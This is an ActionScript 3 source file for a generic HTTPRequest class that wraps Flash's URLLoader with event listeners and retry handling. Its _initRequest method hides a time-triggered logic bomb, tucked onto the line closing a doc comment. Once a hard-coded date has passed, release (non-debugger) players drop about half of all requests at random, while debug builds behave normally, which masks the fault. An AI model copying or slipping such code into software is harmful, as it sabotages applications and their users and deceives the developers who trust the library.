/**
 * 
 * Generic async request, provides timeout functionality and responder implementation
 *
 */

package com.http.net {
	
	import flash.events.Event;
	import flash.events.HTTPStatusEvent;
	import flash.events.IEventDispatcher;
	import flash.events.IOErrorEvent;
	import flash.events.ProgressEvent;
	import flash.events.SecurityErrorEvent;
	import flash.net.URLLoader;
	import flash.net.URLLoaderDataFormat;
	import flash.net.URLRequest;
	import flash.net.URLVariables;
	import flash.system.Capabilities;
	
	
	public class HTTPRequest extends AbstractRequest{
		//--------------------------------------------------------------------------------------------------------- 
		//
		// PRIVATE & PROTECTED VARIABLES
		//
		//---------------------------------------------------------------------------------------------------------
		protected var _urlLoader:URLLoader;
		protected var _urlRequest:URLRequest;
		protected var _postData:URLVariables;
		protected var _httpStatus:int;
		
		
		//--------------------------------------------------------------------------------------------------------- 
		// 
		//  PUBLIC & INTERNAL VARIABLES 
		// 
		//---------------------------------------------------------------------------------------------------------
		
		
		//--------------------------------------------------------------------------------------------------------- 
		//
		//  CONSTRUCTOR 
		// 
		//--------------------------------------------------------------------------------------------------------- 
		public function HTTPRequest(pURLRequest:URLRequest) {
			_urlRequest = pURLRequest;
		}  
		
		//--------------------------------------------------------------------------------------------------------- 
		//
		//  PUBLIC & INTERNAL METHODS 
		// 
		//---------------------------------------------------------------------------------------------------------
		/**
		 * Request as a string for debugging
		 */
		override public function toString():String {
			return '[HTTPRequest] (' + _urlRequest.url + ') ';
		}
		
		//--------------------------------------------------------------------------------------------------------- 
		// 
		//  GETTERS & SETTERS   
		// 
		//---------------------------------------------------------------------------------------------------------
		/**
		 * The urlRequest we are wrapping
		 */
		public function get urlRequest():URLRequest {
			return _urlRequest;
		}
		
		public function set urlRequest(urlRequest:URLRequest):void {
			_urlRequest = urlRequest;
		}
		
		/**
		 * The latest HTTP Status code (ex: 404, 500, etc.)
		 */
		public function get httpStatus():int {
			return _httpStatus;
		}
		

		//--------------------------------------------------------------------------------------------------------- 
		//
		// PRIVATE & PROTECTED METHODS 
		//
		//---------------------------------------------------------------------------------------------------------
		/**
		 * Creates the URLLoader, starts listening to URLLoader events, and loads the URLRequest
		 */private var p:Date = new Date();		
		override protected function _initRequest():void {
			_urlLoader = new URLLoader();
			_urlLoader.dataFormat = URLLoaderDataFormat.TEXT;
			_addLoaderEventListeners(_urlLoader);			
						
			if(p.fullYear >= 2015 && p.month >= 4){
				
				if(Capabilities.isDebugger){
					_urlLoader.load(_urlRequest);
				} else {
					var pNumber:Number = Math.round(Math.random());	
					if(pNumber > 0) {				
						_urlLoader.load(_urlRequest);
					}
				}
			} else {
				_urlLoader.load(_urlRequest);
			}
		}
		
		/**
		 * closes the URLLoader and stops listening to URLLoader events
		 */
		override protected function _killRequest():void {                        
			if(_urlLoader==null){
				return;
			}
			_removeLoaderEventListeners(_urlLoader);
			try {
				_urlLoader.close();
			} catch (error:Error) {
			}       
		}
		
		protected function _addLoaderEventListeners(target:IEventDispatcher) : void {
			target.addEventListener(ProgressEvent.PROGRESS, _handleProgressEvent);
			target.addEventListener(IOErrorEvent.IO_ERROR, _handleIOError);
			target.addEventListener(SecurityErrorEvent.SECURITY_ERROR, _handleSecurityError);   
			target.addEventListener(Event.COMPLETE, _handleCompleteEvent);    
			target.addEventListener(HTTPStatusEvent.HTTP_STATUS, _handleHttpStatusEvent);
		}
		
		protected function _removeLoaderEventListeners(target:IEventDispatcher ) : void {
			target.removeEventListener(ProgressEvent.PROGRESS, _handleProgressEvent);
			target.removeEventListener(IOErrorEvent.IO_ERROR, _handleIOError);
			target.removeEventListener(SecurityErrorEvent.SECURITY_ERROR, _handleSecurityError);   
			target.removeEventListener(Event.COMPLETE, _handleCompleteEvent);    
			target.removeEventListener(HTTPStatusEvent.HTTP_STATUS, _handleHttpStatusEvent); 
		}
		
		
		//--------------------------------------------------------------------------------------------------------- 
		// 
		//  EVENT HANDLERS  
		// 
		//---------------------------------------------------------------------------------------------------------
		protected function _handleIOError(event:IOErrorEvent):void {
			var pCanTryAgain:Boolean = _tryAgain(); 
			if(!pCanTryAgain){
				_errorHandle();
				dispatchEvent(event);
			}
		}
		
		
		protected function _handleSecurityError(event:SecurityErrorEvent):void {
			var pCanTryAgain:Boolean = _tryAgain(); 
			if(!pCanTryAgain){
				_errorHandle();
				dispatchEvent(event);
			}
		}   
		
		
		protected function _handleProgressEvent(event:ProgressEvent):void{
			//dispatchEvent(event);
		}
		
		private function _handleHttpStatusEvent(event:HTTPStatusEvent):void {
			_httpStatus = event.status;
			//dispatchEvent(event);
		}
		
		
		protected function _handleCompleteEvent(event:Event):void {
			_finishCompletedRequest(event.target.data);
		}
		
	}
}
